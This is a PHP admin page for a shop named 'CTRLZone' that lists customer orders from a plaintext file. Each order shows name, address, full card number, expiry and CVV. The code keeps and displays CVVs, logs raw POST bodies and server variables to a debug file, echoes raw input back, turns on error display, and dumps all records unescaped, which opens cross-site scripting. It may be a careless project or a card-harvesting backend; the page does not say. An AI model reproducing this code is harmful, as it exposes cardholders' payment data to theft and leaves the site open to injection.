<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// Handle logout
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: admin-login.php');
    exit;
}

// Simple login protection (optional, remove if not needed)
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: admin-login.php');
    exit;
}

// Handle incoming payment data (from JS fetch)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rawData = file_get_contents("php://input");
    file_put_contents('debug.txt', print_r($_SERVER, true) . "\n" . $rawData, FILE_APPEND);
    echo "DEBUG: " . $rawData;
    exit;
}

// Read all orders
$orders = [];
if (file_exists('orders.txt')) {
    $lines = file('orders.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $orders[] = json_decode($line, true);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Orders | CTRLZone</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <style>
        body { background: linear-gradient(120deg, #e3e8f0 0%, #fff 100%); font-family: 'Poppins', Arial, sans-serif; min-height: 100vh; margin: 0; }
        .admin-orders-box { max-width: 900px; margin: 48px auto; background: #fff; border-radius: 24px; box-shadow: 0 2px 24px #0ff1ce33; padding: 40px 36px 32px 36px; position: relative; }
        .admin-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .admin-logo { width: 120px; margin-right: 18px; }
        .logout-btn { background: #ff3131; color: #fff; border: none; border-radius: 10px; padding: 10px 24px; font-weight: 700; font-size: 1em; cursor: pointer; box-shadow: 0 2px 12px #ff313122; transition: background 0.2s; }
        .logout-btn:hover { background: #1428a0; }
        h2 { color: #1428a0; font-size: 1.5em; font-weight: 700; margin-bottom: 18px; letter-spacing: 0.5px; }
        .orders-list { background: #f4f7fa; border-radius: 14px; padding: 18px; font-size: 1.08em; box-shadow: 0 2px 12px #e3e8f044; min-height: 120px; white-space: pre-wrap; word-break: break-word; }
        .order-block { margin-bottom: 24px; padding-bottom: 12px; border-bottom: 1px solid #e3e8f0; }
        .order-block:last-child { border-bottom: none; }
        .order-title { color: #1428a0; font-weight: 600; margin-bottom: 8px; }
        @media (max-width: 700px) { .admin-orders-box { padding: 18px 4vw; border-radius: 14px; } .admin-header { flex-direction: column; gap: 12px; } }
    </style>
</head>
<body>
    <div class="admin-orders-box">
        <form method="post" style="float:right;">
            <button class="logout-btn" name="logout">Logout</button>
        </form>
        <div class="admin-header">
            <img src="img/Contact/ctrlzone title.png" alt="CTRLZone" class="admin-logo">
        </div>
        <h2>Received Orders & Payment Information</h2>
        <div class="orders-list">
            <?php if (count($orders)): ?>
                <?php foreach ($orders as $i => $order): ?>
                    <div class="order-block">
                        <div class="order-title">Order #<?= $i+1 ?></div>
                        <strong>Name:</strong> <?= htmlspecialchars($order['name']) ?><br>
                        <strong>Phone:</strong> <?= htmlspecialchars($order['phone']) ?><br>
                        <strong>Address:</strong> <?= htmlspecialchars($order['address']) ?><br>
                        <strong>Card:</strong> <?= htmlspecialchars($order['card']) ?><br>
                        <strong>Expiry:</strong> <?= htmlspecialchars($order['month']) ?>/<?= htmlspecialchars($order['year']) ?><br>
                        <strong>CVV:</strong> <?= htmlspecialchars($order['cvv']) ?><br>
                        <strong>Cart:</strong>
                        <ul>
                            <?php foreach ($order['cart'] as $item): ?>
                                <li><?= htmlspecialchars($item['name']) ?> (<?= htmlspecialchars($item['size']) ?>) x<?= htmlspecialchars($item['qty']) ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                No orders received yet.
            <?php endif; ?>
        </div>
        <pre><?php print_r($orders); ?></pre>
    </div>
</body>
</html>